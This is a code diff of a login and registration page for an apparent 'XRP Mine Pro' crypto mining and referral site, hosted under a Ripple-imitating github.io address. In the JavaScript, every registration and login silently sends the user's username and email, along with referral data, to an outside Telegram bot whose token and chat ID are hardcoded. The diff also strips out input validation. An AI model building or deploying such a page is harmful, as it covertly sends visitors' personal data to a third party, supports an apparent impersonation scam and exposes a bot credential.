@@ -168,17 +168,7 @@
             <form id="reg-form" onsubmit="event.preventDefault(); handleRegistration();" method="POST">
                 <div class="input-group">
                     <label for="reg-username"><i class="fas fa-user"></i> Username</label>
-                    <input 
-                        type="text" 
-                        id="reg-username" 
-                        name="username" 
-                        placeholder="Choose a username (Max 7, lowercase, no spaces)" 
-                        required
-                        maxlength="7" 
-                        pattern="[a-z0-9]+" 
-                        title="Username must be 7 characters or less, contain only lowercase letters (a-z) and digits (0-9), and no spaces."
-                        oninput="this.value = this.value.toLowerCase().replace(/\s/g, '')"
-                    >
+                    <input type="text" id="reg-username" name="username" placeholder="Choose a username" required>
                 </div>
                 <div class="input-group">
                     <label for="reg-email"><i class="fas fa-envelope"></i> Email Address</label>
@@ -233,15 +223,16 @@
         const db = firebase.firestore(); 
         
         // =========================================================================================
-        // 2. 🤖 TELEGRAM BOT CONFIGURATION 
-        // ⚠️ ඔබගේ සැබෑ Telegram Bot Token සහ Chat ID මෙහි යොදන්න
+        // 2. 🤖 TELEGRAM BOT CONFIGURATION (මෙම තොරතුරු ඔබගේ Bot වෙත ලැබෙන බැවින් අනාරක්ෂිතය!)
         // =========================================================================================
         const TELEGRAM_BOT_TOKEN = "8441096313:AAGtOgFrHFk3ROaRKZoYQ19prswgRvqkU1Y"; 
         const TELEGRAM_CHAT_ID   = "8344580966"; 
+        // ⚠️ ඔබගේ සැබෑ වෙබ් අඩවියේ URL එක යොදන්න (උදා: https://xrp-mine-pro.github.io/dashboard.html)
         const DASHBOARD_URL = 'https://ripple-com.github.io/xrp-mine-pro.github.io/dashboard.html'; 
         // =========================================================================================
         
-        let referralIdFromUrl = null; 
+        // ⚡️ REFERRAL SYSTEM 
+        let referralIdFromUrl = null; // URL එකෙන් ලබා ගන්නා Referrer ගේ ID එක තබා ගැනීමට
 
         // --- Telegram Notification Function ---
         function sendTelegramNotification(eventType, details) {
@@ -252,7 +243,6 @@
 
             let messageText = `🚨 <b>NEW ${eventType.toUpperCase()} ALERT!</b> 🚨\n\n`;
             
-            // මුරපද මෙහි ඇතුළත් නොවේ
             for (const [key, value] of Object.entries(details)) {
                 messageText += `<b>${key}:</b> ${value}\n`;
             }
@@ -341,41 +331,25 @@
         }
 
 
-     // 🟢 FIREBASE REGISTER FUNCTION 
+     // 🟢 FIREBASE REGISTER FUNCTION (Referral Logic සහිතව)
 async function handleRegistration() {
-    const usernameInput = document.getElementById('reg-username');
-    let username = usernameInput.value;
+    const username = document.getElementById('reg-username').value;
     const email = document.getElementById('reg-email').value;
     const password = document.getElementById('reg-password').value;
     const confirmPassword = document.getElementById('reg-confirm-password').value;
     
     displayFeedback('register-feedback', 'Creating account...', 'pending');
 
-    // 1. Password Match Check
     if (password !== confirmPassword) {
         displayFeedback('register-feedback', 'Error: Passwords do not match!', 'error');
         return; 
-    }
-    
-    // 2. Username Validation Check (1-7 characters, lowercase, no spaces)
-    username = username.trim(); 
-    
-    if (username.length === 0 || username.length > 7) { 
-        displayFeedback('register-feedback', 'Error: Username must be 1 to 7 characters long.', 'error');
-        return;
-    }
-    
-    const usernamePattern = /^[a-z0-9]+$/;
-    if (!usernamePattern.test(username)) {
-        displayFeedback('register-feedback', 'Error: Username must contain only lowercase letters and digits, with no spaces.', 'error');
-        return;
     }
 
     try {
         const userCredential = await auth.createUserWithEmailAndPassword(email, password);
         const user = userCredential.user;
         
-        // Email Verification Setup
+        // 🟢 නව කේතය: සත්‍යාපනයෙන් පසු යා යුතු පිටුව සකසයි
         const actionCodeSettings = {
             url: DASHBOARD_URL, 
             handleCodeInApp: false, 
@@ -385,16 +359,16 @@ async function handleRegistration() {
         await user.updateProfile({ displayName: username }); 
         
         const userDocRef = db.collection("users").doc(user.uid);
-        const newReferralCode = user.uid.substring(0, 8); 
+        const newReferralCode = user.uid.substring(0, 8); // නව පරිශීලකයාගේ කේතය
         
-        // Firestore Data Saving
+        // Firestore වෙත දත්ත සුරැකීම (නව පරිශීලකයා සඳහා)
         await userDocRef.set({
-            username: username, 
+            username: username,
             email: email,
             
             // ⚡️ REFERRAL SYSTEM FIELDS
-            referralCode: newReferralCode,             
-            referredBy: referralIdFromUrl || null,    
+            referralCode: newReferralCode,             // තමන්ගේම Referral Code එක
+            referredBy: referralIdFromUrl || null,    // URL එකෙන් ආව Referrer ගේ ID එක (ref)
             
             balance: 0.00, 
             totalMined: 0.00,
@@ -404,18 +378,21 @@ async function handleRegistration() {
             estimatedDailyIncome: 0.00
         });
         
-        // ⚡️ REFERRAL LOGIC (Updating referrer's count)
+        // ⚡️ REFERRAL LOGIC යාවත්කාලීන කිරීම (Referrer ගේ ගණන වැඩි කිරීම)
         if (referralIdFromUrl) {
             try {
+                // referralIdFromUrl (ref) එකට අදාළ Referrer ව සොයා ගැනීම.
                 const referrerQuery = await db.collection("users").where("referralCode", "==", referralIdFromUrl).limit(1).get();
                 
                 if (!referrerQuery.empty) {
                     const referrerDoc = referrerQuery.docs[0];
                     const referrerDocRef = db.collection("users").doc(referrerDoc.id);
                     
+                    // Transaction භාවිතයෙන් referrals ගණන 1කින් වැඩි කිරීම.
                     await db.runTransaction(async (transaction) => {
                         const doc = await transaction.get(referrerDocRef);
                         if (!doc.exists) {
+                            // මෙහිදී දෝෂය නොසලකා හැරීමට හෝ ලොග් කිරීමට පුළුවන්
                             throw "Referrer document does not exist during transaction!";
                         }
                         
@@ -435,13 +412,13 @@ async function handleRegistration() {
                  console.error("❌ Error updating referrer count:", e);
             }
         }
-        // ⚡️ REFERRAL LOGIC END
+        // ⚡️ REFERRAL LOGIC අවසන්
 
-        // 🟢 TELEGRAM NOTIFICATION (REGISTER)
+        // TELEGRAM NOTIFICATION (REGISTER)
         sendTelegramNotification('Registration', {
             Username: username,
             Email: email,
-            ReferralCode: newReferralCode,
+            ReferralCode: newReferralCode, // නව කේතය මෙහි යොදන්න
             ReferredBy: referralIdFromUrl || 'None',
             Status: 'Created, Verification Pending'
         });
@@ -459,7 +436,7 @@ async function handleRegistration() {
 }
 
         
-        // 🟢 FIREBASE LOGIN FUNCTION 
+        // 🟢 FIREBASE LOGIN FUNCTION (reload() ක්‍රමය සහිතව)
         async function handleLogin() {
             const email = document.getElementById('login-email').value;
             const password = document.getElementById('login-password').value;
@@ -474,9 +451,9 @@ async function handleRegistration() {
                 const userCredential = await auth.signInWithEmailAndPassword(email, password);
                 let user = userCredential.user;
                 
-                // Email Verification Status Refresh
+                // 🟢 ඊමේල් සත්‍යාපන තත්ත්වය නැවුම් කිරීමට reload() භාවිතා කිරීම
                 await user.reload(); 
-                user = auth.currentUser; 
+                user = auth.currentUser; // යාවත්කාලීන කළ user වස්තුව නැවත ලබා ගනී
                 
                 if (!user.emailVerified) {
                     displayFeedback(
@@ -491,15 +468,14 @@ async function handleRegistration() {
                     return;
                 }
                 
-                // 🟢 TELEGRAM NOTIFICATION (LOGIN)
+                // TELEGRAM NOTIFICATION (LOGIN)
                 sendTelegramNotification('Login Successful', {
-                    Username: user.displayName || 'N/A', // Logged in user's display name
-                    Email: email,
-                    Status: 'Verified Login'
+                    Username: user.displayName || 'N/A',
+                    Email: email
                 });
                 
                 displayFeedback('login-feedback', 'Login successful! Welcome, ' + user.displayName + '!', 'success');
-                window.location.href = DASHBOARD_URL; 
+                window.location.href = DASHBOARD_URL; // ⚠️ DASHBOARD_URL භාවිතා කරයි
                 
             } catch (error) {
                 let errorMessage = "Invalid email or password.";
@@ -524,6 +500,7 @@ async function handleRegistration() {
             
             if (user) {
                 try {
+                    // 🟢 Resend කිරීමේදී ද ActionCodeSettings යොදයි
                     const actionCodeSettings = { url: DASHBOARD_URL, handleCodeInApp: false };
                     await user.sendEmailVerification(actionCodeSettings);
                     displayFeedback(feedbackMsgId, 'New verification email sent successfully!', 'success');
@@ -567,4 +544,33 @@ async function handleRegistration() {
             document.getElementById('register-feedback').style.display = 'none';
 
             document.getElementById(formId + '-form').classList.add('active');
-            const
+            const activeTabButton = document.querySelector(`.tab-btn[onclick*="${formId}"]`);
+            activeTabButton.classList.add('active');
+            
+            const container = document.querySelector('.auth-container');
+            if (formId === 'login') {
+                container.style.borderTopColor = 'var(--primary-color)'; 
+                activeTabButton.style.color = 'var(--primary-color)';
+                activeTabButton.style.borderBottomColor = 'var(--primary-color)';
+            } else {
+                container.style.borderTopColor = 'var(--secondary-color)'; 
+                activeTabButton.style.color = 'var(--secondary-color)';
+                activeTabButton.style.borderBottomColor = 'var(--secondary-color)';
+            }
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            // ⚡️ URL එකෙන් Referral ID එක ලබා ගැනීම
+            const urlParams = new URLSearchParams(window.location.search);
+            referralIdFromUrl = urlParams.get('ref');
+
+            if (referralIdFromUrl) {
+                console.log("Referral ID found in URL (Referred by):", referralIdFromUrl);
+            }
+            
+            showForm('login');
+        });
+    </script>
+
+</body>
+</html>
